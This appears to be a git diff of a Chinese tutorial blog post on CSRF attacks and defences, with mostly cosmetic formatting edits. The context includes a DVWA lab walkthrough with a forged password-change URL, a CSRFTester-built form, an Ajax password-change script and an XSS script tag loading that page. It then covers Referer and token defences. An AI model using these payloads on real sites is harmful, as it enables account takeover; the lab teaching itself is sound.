@@ -24,13 +24,13 @@ date: 2019-08-22 09:27:05
 
 　　与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。
 
-![CSRF攻击模型](CSRF的攻击与防御原理/CSRF攻击模型.jpeg)
+![](CSRF的攻击与防御原理/CSRF攻击模型.jpeg)
 
 　　上图为CSRF攻击的一个简单模型，用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。
 
 ### CSRF的攻击原理
 
-![CSRF的攻击原理](CSRF的攻击与防御原理/CSRF的攻击原理.jpeg)
+![](CSRF的攻击与防御原理/CSRF的攻击原理.jpeg)
 
 1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
 
@@ -64,7 +64,7 @@ date: 2019-08-22 09:27:05
 
 　　当你登录网站A后，没有及时登出，这时你访问了论坛B，不幸的事情发生了，你会发现你的账号里面少了10000块。
 
-　　 为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的`<img>`标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址`www.xxx.com/transfer.do?accountNum=l000l&money=10000`，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。
+　　为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的`<img>`标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址`www.xxx.com/transfer.do?accountNum=l000l&money=10000`，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。
 
 　　当然，绝大多数网站都不会使用GET请求来进行数据更新，因此，攻击者也需要改变思路，与时俱进。
 
@@ -89,13 +89,13 @@ date: 2019-08-22 09:27:05
 
 #### CSRF漏洞🔺Get方式利用
 
-![CSRF漏洞-Get方式利用](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用.png)
+![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用.png)
 
 漏洞确认：
 
 1、修改密码，没有对原密码进行验证，直接修改了， 判断缺少验证机制，可能存在CSRF
 
-![CSRF漏洞-Get方式利用-漏洞确认](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认.png)
+![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认.png)
 
 2、确认referer无限制，无token
 
@@ -103,7 +103,7 @@ date: 2019-08-22 09:27:05
 http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
 ```
 
-![CSRF漏洞-Get方式利用-漏洞确认2](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认2.png)
+![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认2.png)
 
 漏洞利用：
 
@@ -143,23 +143,23 @@ http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&password
 
 找到`/csrf的low.php`，将`$＿GET`修改为`$＿REQUEST`(说明:这个表示可以用get也可以用POST)
 
-![POST方式](CSRF的攻击与防御原理/POST方式.png)
+![](CSRF的攻击与防御原理/POST方式.png)
 
-![POST方式2](CSRF的攻击与防御原理/POST方式2.png)
+![](CSRF的攻击与防御原理/POST方式2.png)
 
 测试是否成功修改POST提交方式
 
 POST方式提交，提交后URL不会出现具体的参数及参数值
 
-![POST方式验证](CSRF的攻击与防御原理/POST方式验证.png)
+![](CSRF的攻击与防御原理/POST方式验证.png)
 
 抓取POST提交方式的数据包
 
-![POST方式抓包结果](CSRF的攻击与防御原理/POST方式抓包结果.png)
+![](CSRF的攻击与防御原理/POST方式抓包结果.png)
 
 通过OWASP CSRFTester抓包
 
-![CSRFTester](CSRF的攻击与防御原理/CSRFTester.png)
+![](CSRF的攻击与防御原理/CSRFTester.png)
 
 OWASP CSRFTester构建表单
 
@@ -175,17 +175,17 @@ Link：创建一个a标签的超链接（只能get）
 
 修改上一步生产的index.html
 
-![CSRFTester创建的表单](CSRF的攻击与防御原理/CSRFTester创建的表单.png)
+![](CSRF的攻击与防御原理/CSRFTester创建的表单.png)
 
 将文档放置在csrf站点，`http://192.168.123.130/csrf/index.html`
 
-![CSRFTester放置站点](CSRF的攻击与防御原理/CSRFTester放置站点.png)
+![](CSRF的攻击与防御原理/CSRFTester放置站点.png)
 
 测试
 
-步骤1：保持dvwa在csrf的模块
+1、保持dvwa在csrf的模块
 
-2、在同一个浏览器输入url，http://192.168.123.130/csrf/index.html，然后退出dvwa页面登录，测试密码是否为444，`但是没有办法静默执行，因为会有提示`
+2、在同一个浏览器输入url，`http://192.168.123.130/csrf/index.html`，然后退出dvwa页面登录，测试密码是否为444，但是没有办法静默执行，因为会有提示
 
 ##### 使用Ajax思路
 
@@ -206,7 +206,7 @@ xmlhttp.send(“password_new=123456&password_conf=123456”&Change=Change”);
 </script>
 ```
 
-![ajax](CSRF的攻击与防御原理/ajax.png)
+![](CSRF的攻击与防御原理/ajax.png)
 
 `http://192.168.123.130/csrf/ajax.html`
 
@@ -216,13 +216,13 @@ xmlhttp.send(“password_new=123456&password_conf=123456”&Change=Change”);
 <script src="http://192.168.123.130/csrf/ajax.html"></script>
 ```
 
-![利用反射型XSS更改密码](CSRF的攻击与防御原理/利用反射型XSS更改密码.png)
+![](CSRF的攻击与防御原理/利用反射型XSS更改密码.png)
 
 此时密码已经修改
 
 4、用admin和password登录成功
 
-![登陆成功](CSRF的攻击与防御原理/登陆成功.png)
+![](CSRF的攻击与防御原理/登陆成功.png)
 
 　　如果在目标站点本身上存在XSS，则可以这样利用，使用`<script>，<img>`标签。但目标站点如果存在XSS，则直接利用XSS比利用CSRF更便捷。
 
@@ -268,13 +268,13 @@ xmlhttp.send(“password_new=123456&password_conf=123456”&Change=Change”);
 
 #### 验证HTTP Referer字段
 
-　　根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。
+　　根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问`http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory`，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。
 
-​        这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
+　　这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
 
-​        然而，这种方法并非万无一失。Referer的值可以抓包伪造修改，使得黑客完全可以把用户浏览器的Referer值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。
+　　然而，这种方法并非万无一失。Referer的值可以抓包伪造修改，使得黑客完全可以把用户浏览器的Referer值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。
 
-　　即便黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。
+　　即便黑客无法篡改Referer值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。
 
 #### 在请求地址中添加 token 并验证
 
@@ -298,7 +298,7 @@ xmlhttp.send(“password_new=123456&password_conf=123456”&Change=Change”);
 
 　　这种方法要比检查Referer要安全一些，token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。token的值必须是随机的，不可预测的。有了token的存在，攻击者无法再构造一个带有合法token的请求实施CSRF攻击。另外使用token时应注意token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免token泄露。`但这种方法的难点在于如何把token以参数的形式加入请求`。
 
-　　对于GET请求，token将附在请求地址之后，这样URL就变成 http://url?csrftoken=tokenvalue。 而对于POST请求来说，要在form的最后加上 <input type="hidden" name="csrftoken" value="tokenvalue"/>，这样就把token以参数的形式加入请求了。
+　　对于GET请求，token将附在请求地址之后，这样URL就变成 `http://url?csrftoken=tokenvalue`。 而对于POST请求来说，要在form的最后加上 `<input type="hidden" name="csrftoken" value="tokenvalue"/>`，这样就把token以参数的形式加入请求了。
 
 　　但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上token是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用javascript遍历整个dom树，对于dom中所有的a和form标签后加入token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的html代码，这种方法就没有作用，还需要程序员在编码时手动添加token。
 
